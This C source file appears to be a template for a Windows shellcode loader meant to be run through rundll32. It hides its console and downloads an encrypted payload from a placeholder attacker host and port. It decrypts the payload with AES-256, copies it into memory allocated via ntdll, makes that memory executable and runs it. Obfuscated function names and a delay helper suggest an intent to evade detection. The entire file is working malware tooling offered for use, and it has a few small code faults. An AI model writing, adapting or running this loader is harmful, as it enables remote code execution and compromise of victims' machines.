
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <wininet.h>
#include <ntstatus.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")

typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* PNTFREEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef NTSTATUS(WINAPI* PNTPROTECTVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

static NTSTATUS(__stdcall* NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) =
    (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall* ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) =
    (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");

static void Random4(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
    (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

BOOL Random3(LPCWSTR szUrl, PBYTE* RandomB, SIZE_T* pBufferSize) {
    BOOL bSuccess = TRUE;
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    SIZE_T totalSize = 0;
    PBYTE pBuffer = NULL;
    PBYTE pTempBuffer = NULL;
    DWORD bytesRead = 0;

    // Open Internet session handle
    hInternet = InternetOpenW(L"Microsoft", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        wprintf(L"[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    // Open handle to the payload using the payload's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        wprintf(L"[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    // Allocate 1024 bytes for the temp buffer
    pTempBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
    if (pTempBuffer == NULL) {
        bSuccess = FALSE;
        goto _EndOfFunction;
    }

    while (TRUE) {
        // Read 1024 bytes to the temp buffer
        if (!InternetReadFile(hUrl, pTempBuffer, 1024, &bytesRead)) {
            wprintf(L"[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSuccess = FALSE;
            goto _EndOfFunction;
        }

        // Calculate the total size of the buffer
        totalSize += bytesRead;

        // If the total buffer is not allocated yet, allocate it
        if (pBuffer == NULL)
            pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalSize);
        else
            pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, totalSize);

        if (pBuffer == NULL) {
            bSuccess = FALSE;
            goto _EndOfFunction;
        }

        // Append the temp buffer to the end of the total buffer
        memcpy(pBuffer + (totalSize - bytesRead), pTempBuffer, bytesRead);

        // Clean up the temp buffer
        memset(pTempBuffer, 0, bytesRead);

        // If less than 1024 bytes were read, exit the loop
        if (bytesRead < 1024) {
            break;
        }
    }

    // Save results
    *RandomB = pBuffer;
    *pBufferSize = totalSize;

_EndOfFunction:
    // Cleanup
    if (hInternet) InternetCloseHandle(hInternet);
    if (hUrl) InternetCloseHandle(hUrl);

    return bSuccess;
}

int Random1(char* difern, unsigned int difern_len, char* Random2, size_t Random2len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }

    if (!CryptHashData(hHash, (BYTE*)Random2, (DWORD)Random2len, 0)) {
        return -1;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)difern, &difern_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char Random2[] = KEYVALUE

extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    // URL to download the payload from
    LPCWSTR szUrl = L"http://HOSTIP:PORTY/SHELLCODEFILE";  // Replace with your actual URL

    PBYTE RandomB;
    SIZE_T RandomBSize = 0;

    FreeConsole();

    // Download the payload
    if (!Random3(szUrl, &RandomB, &RandomBSize)) {
        printf("[!] Random3 Failed\n");
        return 1;
    }

    // Decrypt payload
    Random1((char*)RandomB, RandomBSize, Random2, sizeof(Random2));

    // Allocate Virtual Memory
    void* exec = NULL;
    SIZE_T size = RandomBSize;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &exec,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    // Copy shellcode into allocated memory
    memcpy(exec, RandomB, RandomBSize);

    // Change the memory protection to RX (Read and Execute)
    DWORD oldProtect;
   
if (VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
    // Handle error if needed
    return -1;
}

    // Execute shellcode in memory
    ((void(*)())exec)();

    // Free the allocated memory using NtFreeVirtualMemory
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    SIZE_T regionSize = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

    return 0;
}

